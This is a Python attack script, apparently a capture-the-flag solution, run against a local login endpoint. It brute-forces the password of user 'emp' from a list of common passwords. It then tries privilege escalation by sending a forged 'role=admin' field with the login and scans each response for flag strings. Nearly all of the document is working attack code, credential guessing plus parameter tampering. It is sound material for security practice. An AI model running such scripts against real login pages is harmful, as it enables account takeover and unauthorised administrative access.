print("Starting test")

import requests
import re

target = "http://127.0.0.1:5003/login"
user = "emp"
pwds = ["password", "emp123", "employee", "admin", "123456"]

print("\n[Phase 1] Password Brute-Force\n")

valid = []
for p in pwds:
    resp = requests.post(target, data={"username": user, "password": p}, allow_redirects=False)
    if resp.status_code in [200, 302]:
        print(f"[+] Valid: {p} -> {resp.status_code}")
        print(f"    Response: {resp.text}")
        valid.append(p)
        
if valid:
    print(f"\n[Phase 2] Role Escalation Test with: {valid[0]}\n")
    
    # Test employee role
    r1 = requests.post(target, data={"username": user, "password": valid[0], "role": "employee"}, allow_redirects=False)
    print(f"[role=employee] Status: {r1.status_code}")
    print(f"Response: {r1.text}")
    flags = re.findall(r'FLAG\{[^}]+\}', r1.text)
    if flags: print(f"FLAGS: {flags}")
    
    # Test admin role
    r2 = requests.post(target, data={"username": user, "password": valid[0], "role": "admin"}, allow_redirects=False)
    print(f"\n[role=admin] Status: {r2.status_code}")
    print(f"Response: {r2.text}")
    flags = re.findall(r'FLAG\{[^}]+\}', r2.text)
    if flags: print(f"FLAGS: {flags}")
    
print("\nComplete")

